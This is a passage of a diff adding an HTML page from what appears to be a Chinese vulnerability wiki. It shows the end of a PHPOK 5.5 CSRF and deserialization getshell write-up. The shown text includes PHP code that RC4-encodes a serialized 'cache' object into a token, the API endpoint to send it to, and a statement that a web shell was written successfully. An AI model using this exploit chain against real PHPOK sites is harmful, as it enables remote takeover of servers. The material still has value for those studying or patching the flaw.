+        <span class="k">for</span><span class="p">(</span><span class="nv">$a</span> <span class="o">=</span> <span class="nv">$j</span> <span class="o">=</span> <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$string_length</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
+            <span class="nv">$a</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$a</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="mi">256</span><span class="p">;</span>
+            <span class="nv">$j</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$j</span> <span class="o">+</span> <span class="nv">$box</span><span class="p">[</span><span class="nv">$a</span><span class="p">])</span> <span class="o">%</span> <span class="mi">256</span><span class="p">;</span>
+            <span class="nv">$tmp</span> <span class="o">=</span> <span class="nv">$box</span><span class="p">[</span><span class="nv">$a</span><span class="p">];</span>
+            <span class="nv">$box</span><span class="p">[</span><span class="nv">$a</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$box</span><span class="p">[</span><span class="nv">$j</span><span class="p">];</span>
+            <span class="nv">$box</span><span class="p">[</span><span class="nv">$j</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$tmp</span><span class="p">;</span>
+            <span class="nv">$result</span> <span class="o">.=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$string</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span> <span class="o">^</span> <span class="p">(</span><span class="nv">$box</span><span class="p">[(</span><span class="nv">$box</span><span class="p">[</span><span class="nv">$a</span><span class="p">]</span> <span class="o">+</span> <span class="nv">$box</span><span class="p">[</span><span class="nv">$j</span><span class="p">])</span> <span class="o">%</span> <span class="mi">256</span><span class="p">]));</span>
+        <span class="p">}</span>
+        <span class="k">return</span> <span class="nv">$result</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="nv">$token</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">token</span><span class="p">();</span>
+<span class="nv">$token</span><span class="o">-&gt;</span><span class="na">keyid</span><span class="p">(</span><span class="s1">&#39;123456&#39;</span><span class="p">);</span>
+<span class="k">echo</span> <span class="nv">$token</span><span class="o">-&gt;</span><span class="na">encode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">cache</span><span class="p">));</span>
+<span class="cp">?&gt;</span>
+</code></pre></div>
+
+<p><img alt="6.png" src="../resource/PHPOK5.5csrf%2B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Egetshell/media/rId34.png" /></p>
+<p>运行脚本拿到Payload，请求有进行解密操作的接口，如：</p>
+<div class="codehilite"><pre><span></span><code>http://www.0-sec.org/api.php?c=index&amp;f=phpok&amp;token=
+</code></pre></div>
+
+<p>请求前：</p>
+<p><img alt="7.png" src="../resource/PHPOK5.5csrf%2B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Egetshell/media/rId35.png" /></p>
+<p>请求后：</p>
+<p><img alt="8.png" src="../resource/PHPOK5.5csrf%2B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Egetshell/media/rId36.png" /></p>
+<p>shell写入成功。</p>
+<p>文件内容：</p>
+<p><img alt="9.png" src="../resource/PHPOK5.5csrf%2B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Egetshell/media/rId37.png" /></p>
+<p><img alt="10.png" src="../resource/PHPOK5.5csrf%2B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Egetshell/media/rId38.png" /></p>
+<h2 id="_7">参考链接<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p><a href="https://xz.aliyun.com/t/7852">https://xz.aliyun.com/t/7852</a></p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../PHPUnit/%EF%BC%88CVE-2017-9841%EF%BC%89PHPunit%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../PHPUnit/%EF%BC%88CVE-2017-9841%EF%BC%89PHPunit%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        （CVE-2017-9841）PHPunit 远程代码执行漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../PHPOK%205.3%20%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../PHPOK%205.3%20%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-link">
+        PHPOK 5.3 前台注入
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
